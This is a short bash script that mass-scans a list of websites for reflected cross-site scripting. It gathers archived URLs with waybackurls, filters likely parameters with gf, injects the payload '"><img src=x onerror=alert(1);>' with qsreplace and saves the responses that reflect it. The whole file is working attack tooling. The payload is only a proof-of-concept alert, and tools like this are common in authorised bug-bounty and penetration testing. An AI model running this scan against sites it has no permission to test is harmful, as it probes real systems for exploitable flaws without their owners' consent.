#!/bin/bash

input="websites.txt"
log="scan-log.txt"

if [[ -f "${log}" ]]; then
    line_num=$(tail -n 1 "${log}" | awk '{print $1}')
    if [[ -z "${line_num}" ]]; then
        line_num=1
    else
        line_num=$((line_num+1))
    fi
    sed -i "1,${line_num}d" "${input}"
else
    line_num=1
fi

while IFS= read -r website
do
    echo "Scanning line ${line_num}: ${website}"
    result=$(echo "${website}" | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | grep "XSS")
    if [[ -n "${result}" ]]; then
        echo "${result}"
        echo "${result}" > "scan-result-${line_num}.txt"
    fi
    echo "${line_num} ${website}" >> "${log}"
    echo "Scan finished for line ${line_num}"
    ((line_num++))
done < "$input"

echo "All scans completed."
rm "${log}"
